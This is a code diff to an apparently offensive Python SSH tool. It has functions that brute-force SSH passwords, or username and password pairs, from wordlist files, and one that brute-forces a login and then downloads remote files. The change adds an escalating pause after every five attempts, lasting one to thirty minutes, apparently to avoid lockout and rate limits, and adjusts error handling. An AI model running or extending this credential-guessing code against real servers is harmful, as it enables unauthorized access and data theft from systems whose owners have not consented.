@@ -8,6 +8,25 @@ import time
 import paramiko
 import paramiko.ssh_exception
 
+
+def sleep_amount(timer):
+    """
+    Calling different sleeptimes depending on timer input
+    """
+    match timer:
+        case 1:
+            print("Waiting one minute before trying anymore attempts")
+            time.sleep(60)
+        case 2:
+            print("Waiting 5 minutes before trying anymore attempts")
+            time.sleep(60*5)
+        case 3:
+            print("Waiting 10 minutes before trying anymore attempts")
+            time.sleep(60*10)
+        case 4:
+            print("Waiting 30 minutes before trying anymore attempts")
+            time.sleep(60*30)
+
 def ssh_upload(ip, user, password, local_files, remote_path, all_files=False):
     """   
     Uploads an entire directory or specified file.
@@ -25,7 +44,7 @@ def ssh_upload(ip, user, password, local_files, remote_path, all_files=False):
     def upload_files(local_dir, remote_dir): #To upload an entire folder and subfolders.
         try:
             sftp.mkdir(remote_dir)
-        except IOError:#If the folder already exists it wont make a new one.
+        except OSError:#If the folder already exists it wont make a new one.
             pass
 
         for file in os.listdir(local_dir):
@@ -53,7 +72,7 @@ def ssh_upload(ip, user, password, local_files, remote_path, all_files=False):
 
     except paramiko.AuthenticationException:
         print("Failed to authenticate")
-    except Exception as e:
+    except OSError as e:
         print(f"Error: {e}")
     finally:
         ssh.close()
@@ -96,8 +115,6 @@ def ssh_download(ip, user, password, local_path, remote_path, all_files=False):
         sftp = ssh.open_sftp()
         if all_files:#Downloads the entire dir if all_files=True
             download_files(local_path, remote_path)
-        # elif sftp.listdir(remote_path):
-        #     print(f"{remote_path} is a folder!")
         else:
             sftp.get(remote_path, local_path)
             print(f"The file {remote_path} has been downloaded to {local_path}")
@@ -111,7 +128,7 @@ def ssh_download(ip, user, password, local_path, remote_path, all_files=False):
     finally:
         ssh.close()
 
-def ssh_brute_password(ip, username, password_file):
+def ssh_brute_password(ip, username, password_file, sleep=False):
     """
     Bruteforcing an ssh connection with passwords from a file
     """
@@ -123,6 +140,8 @@ def ssh_brute_password(ip, username, password_file):
             passwords = file.read().splitlines()
         print(f"Trying to bruteforce password on {ip} as {username}")
 
+        counter = 0
+        sleep_counter = 1
         for password in passwords:
             try:
                 print(f"Trying {username}-{password}")
@@ -143,11 +162,17 @@ def ssh_brute_password(ip, username, password_file):
             finally:
                 ssh.close()
 
-            time.sleep(0.5)
+            if sleep:
+                counter +=1
+                if counter == 5:
+                    counter = 0
+                    sleep_amount(sleep_counter)
+                    if sleep_counter < 4:
+                        sleep_counter +=1
     else:
         print(f"File: {password_file} Does not exist")
 
-def ssh_brute_user_password(ip, username_file, password_file):
+def ssh_brute_user_password(ip, username_file, password_file, sleep=False):
     """
     Bruteforcing ssh connection with usernames and passwords from files
     """
@@ -164,6 +189,8 @@ def ssh_brute_user_password(ip, username_file, password_file):
         print(f"Trying to bruteforce username and password on {ip}")
         for user in users:
             connection = False
+            counter = 0
+            sleep_counter = 1
             for password in passwords:
                 try:
                     print(f"Trying {user}-{password}")
@@ -185,14 +212,20 @@ def ssh_brute_user_password(ip, username_file, password_file):
                 finally:
                     ssh.close()
 
-                time.sleep(0.5)
+                if sleep:
+                    counter +=1
+                    if counter == 5:
+                        counter = 0
+                        sleep_amount(sleep_counter)
+                        if sleep_counter < 4:
+                            sleep_counter +=1
             if connection:
                 break
 
     except FileNotFoundError as e:
         print(f"Error: {e}")
 
-def ssh_brute_grab(ip, username, password_file, local_path, remote_path):
+def ssh_brute_grab(ip, username, password_file, local_path, remote_path, sleep=False):
     """
     Bruteforcing an ssh connection with passwords from a file and downloads
     files from directories provided from a file.
@@ -226,6 +259,8 @@ def ssh_brute_grab(ip, username, password_file, local_path, remote_path):
             passwords = file.read().splitlines()
         print(f"Trying to bruteforce password on {ip} as {username}")
 
+        counter = 0
+        sleep_counter = 1
         for password in passwords:
             try:
                 print(f"Trying {username}-{password}")
@@ -250,7 +285,13 @@ def ssh_brute_grab(ip, username, password_file, local_path, remote_path):
             finally:
                 ssh.close()
 
-            time.sleep(0.5)
+            if sleep:
+                counter +=1
+                if counter == 5:
+                    counter = 0
+                    sleep_amount(sleep_counter)
+                    if sleep_counter < 4:
+                        sleep_counter +=1
     else:
         print(f"File: {password_file} Does not exist")
 
@@ -282,7 +323,7 @@ def ssh_commands(ip, user, password, commands):
 
             except paramiko.AuthenticationException:
                 print("Failed to authenticate")
-            except Exception as e:
+            except OSError as e:
                 print(f"Error: {e}")
             finally:
                 ssh.close()
